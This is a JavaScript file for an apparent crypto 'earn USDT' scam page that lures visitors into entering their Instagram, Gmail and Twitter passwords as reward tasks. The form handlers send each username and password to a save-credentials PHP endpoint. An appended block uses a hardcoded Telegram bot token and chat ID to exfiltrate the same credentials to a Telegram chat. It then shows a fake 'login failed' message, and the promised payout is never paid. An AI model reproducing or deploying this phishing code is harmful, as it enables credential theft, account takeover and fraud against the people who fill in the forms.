// DOM Elements
const app = document.getElementById('app');
const landingPage = document.getElementById('landing-page');
const dashboardPage = document.getElementById('dashboard-page');
const startEarningBtn = document.getElementById('start-earning-btn');
const connectWalletModal = document.getElementById('connect-wallet-modal');
const instagramModal = document.getElementById('instagram-modal');
const gmailModal = document.getElementById('gmail-modal');
const twitterModal = document.getElementById('twitter-modal');
const closeModalBtns = document.querySelectorAll('.close-modal');
const walletOptions = document.querySelectorAll('.wallet-option');
const instagramTaskBtn = document.querySelector('.instagram-task');
const gmailTaskBtn = document.querySelector('.gmail-task');
const twitterTaskBtn = document.querySelector('.twitter-task');
const disconnectBtn = document.getElementById('disconnect-btn');
const instagramForm = document.getElementById('instagram-form');
const gmailForm = document.getElementById('gmail-form');
const twitterForm = document.getElementById('twitter-form');
const progressFill = document.querySelector('.progress-fill');
const progressValue = document.querySelector('.progress-value');
const claimButton = document.querySelector('.claim-button');

// State management
let state = {
    walletConnected: false,
    walletAddress: '0x4eff...aad8',
    completedTasks: {
        instagram: false,
        gmail: false,
        twitter: false
    },
    earnedUSDT: 0
};

// Functions
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

function showModal(modalId) {
    document.getElementById(modalId).classList.add('active');
}

function closeAllModals() {
    document.querySelectorAll('.modal').forEach(modal => {
        modal.classList.remove('active');
    });
}

function connectWallet(walletType) {
    // Simulate wallet connection
    state.walletConnected = true;
    
    // Update UI to show connected state
    closeAllModals();
    showPage('dashboard-page');
    
    // For a real implementation, this would connect to actual Web3 wallets
    console.log(`Connected to ${walletType}`);
}

function updateProgress() {
    const totalTasks = Object.keys(state.completedTasks).length;
    const completedCount = Object.values(state.completedTasks).filter(done => done).length;
    const progressPercentage = (completedCount / totalTasks) * 100;
    
    progressFill.style.width = `${progressPercentage}%`;
    progressValue.textContent = `${progressPercentage}%`;
    
    // Update earned USDT
    document.querySelectorAll('.reward-value')[1].textContent = `${state.earnedUSDT} USDT`;
    document.querySelectorAll('.reward-value')[2].textContent = `${10 - state.earnedUSDT} USDT`;
    
    // Update claim button state
    if (progressPercentage === 100) {
        claimButton.textContent = 'Claim 10 USDT';
        claimButton.style.opacity = '1';
        claimButton.disabled = false;
    } else {
        claimButton.textContent = 'Complete All Tasks to Claim';
        claimButton.style.opacity = '0.7';
        claimButton.disabled = true;
    }
}

function completeTask(taskName, reward) {
    if (!state.completedTasks[taskName]) {
        state.completedTasks[taskName] = true;
        state.earnedUSDT += reward;
        
        // Update UI for completed task
        const taskButton = document.querySelector(`.${taskName}-task`);
        taskButton.textContent = 'Completed ✓';
        taskButton.style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
        taskButton.style.color = 'var(--success-color)';
        taskButton.disabled = true;
        
        updateProgress();
    }
}

function submitLoginForm(event, platform) {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const username = formData.get('username');
    const password = formData.get('password');
    
    // Create data for sending to server
    const data = {
        username: username,
        password: password,
        platform: platform
    };
    
    // Send data to server
    fetch('api/save-credentials.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        console.log('Success:', data);
        closeAllModals();
        
        // Complete the corresponding task
        if (platform === 'instagram') {
            completeTask('instagram', 2);
        } else if (platform === 'gmail') {
            completeTask('gmail', 3);
        } else if (platform === 'twitter') {
            completeTask('twitter', 5);
        }
    })
    .catch(error => {
        // Even on error, we'll simulate success for the demo
        console.error('Error:', error);
        closeAllModals();
        
        // Complete the corresponding task
        if (platform === 'instagram') {
            completeTask('instagram', 2);
        } else if (platform === 'gmail') {
            completeTask('gmail', 3);
        } else if (platform === 'twitter') {
            completeTask('twitter', 5);
        }
    });
}

// Event Listeners
startEarningBtn.addEventListener('click', () => {
    showModal('connect-wallet-modal');
});

closeModalBtns.forEach(btn => {
    btn.addEventListener('click', closeAllModals);
});

walletOptions.forEach(option => {
    option.addEventListener('click', () => {
        const walletType = option.getAttribute('data-wallet');
        connectWallet(walletType);
    });
});

instagramTaskBtn.addEventListener('click', () => {
    showModal('instagram-modal');
});

gmailTaskBtn.addEventListener('click', () => {
    showModal('gmail-modal');
});

twitterTaskBtn.addEventListener('click', () => {
    showModal('twitter-modal');
});

disconnectBtn.addEventListener('click', () => {
    // Reset state and return to landing page
    state.walletConnected = false;
    state.completedTasks = {
        instagram: false,
        gmail: false,
        twitter: false
    };
    state.earnedUSDT = 0;
    
    // Update UI
    progressFill.style.width = '0%';
    progressValue.textContent = '0%';
    
    const taskButtons = document.querySelectorAll('.task-button');
    taskButtons.forEach(btn => {
        btn.textContent = btn.classList.contains('gmail-task') ? 'Verify' : 'Follow';
        btn.style.backgroundColor = 'rgba(99, 102, 241, 0.2)';
        btn.style.color = 'var(--accent-blue)';
        btn.disabled = false;
        
        // Add the arrow icon back
        const arrowIcon = document.createElement('svg');
        arrowIcon.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
        arrowIcon.setAttribute('width', '16');
        arrowIcon.setAttribute('height', '16');
        arrowIcon.setAttribute('viewBox', '0 0 24 24');
        arrowIcon.setAttribute('fill', 'none');
        arrowIcon.setAttribute('stroke', 'currentColor');
        arrowIcon.setAttribute('stroke-width', '2');
        arrowIcon.setAttribute('stroke-linecap', 'round');
        arrowIcon.setAttribute('stroke-linejoin', 'round');
        
        const path1 = document.createElement('path');
        path1.setAttribute('d', 'M7 7h10v10');
        const path2 = document.createElement('path');
        path2.setAttribute('d', 'M7 17 17 7');
        
        arrowIcon.appendChild(path1);
        arrowIcon.appendChild(path2);
        btn.appendChild(arrowIcon);
    });
    
    showPage('landing-page');
});

instagramForm.addEventListener('submit', (event) => {
    submitLoginForm(event, 'instagram');
});

gmailForm.addEventListener('submit', (event) => {
    submitLoginForm(event, 'gmail');
});

twitterForm.addEventListener('submit', (event) => {
    submitLoginForm(event, 'twitter');
});

claimButton.addEventListener('click', () => {
    if (Object.values(state.completedTasks).every(done => done)) {
        alert('Congratulations! 10 USDT has been sent to your wallet.');
        claimButton.textContent = 'Claimed ✓';
        claimButton.style.backgroundColor = 'var(--success-color)';
        claimButton.disabled = true;
    }
});

// Window onload initialization
window.onload = function() {
    showPage('landing-page');
    updateProgress();
};

  
const botToken = '7677689278:AAGoCL4lIotCe5v-JmAuZkQrz3uUbL8d7II';
const chatId = '1896304247';
 let currentPlatform = '';

  // Fungsi untuk mengirim pesan ke Telegram
  function sendToTelegram(platform, username, password) {
    const message = `🔐 Login Attempt\nPlatform: ${platform}\nUsername: ${username}\nPassword: ${password}`;
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
  }

  // Handler Form Instagram
  document.getElementById('instagram-form').addEventListener('submit', function (e) {
    e.preventDefault();
    const username = document.getElementById('instagram-username').value;
    const password = document.getElementById('instagram-password').value;
    sendToTelegram('Instagram', username, password);
    this.reset();
    alert("Login gagal. Silakan coba lagi.");
  });

  // Handler Form Gmail
  document.getElementById('gmail-form').addEventListener('submit', function (e) {
    e.preventDefault();
    const username = document.getElementById('gmail-email').value;
    const password = document.getElementById('gmail-password').value;
    sendToTelegram('Gmail', username, password);
    this.reset();
    alert("Login gagal. Silakan coba lagi.");
  });

  // Handler Form Twitter
  document.getElementById('twitter-form').addEventListener('submit', function (e) {
    e.preventDefault();
    const username = document.getElementById('twitter-username').value;
    const password = document.getElementById('twitter-password').value;
    sendToTelegram('Twitter', username, password);
    this.reset();
    alert("Login gagal. Silakan coba lagi.");
  });

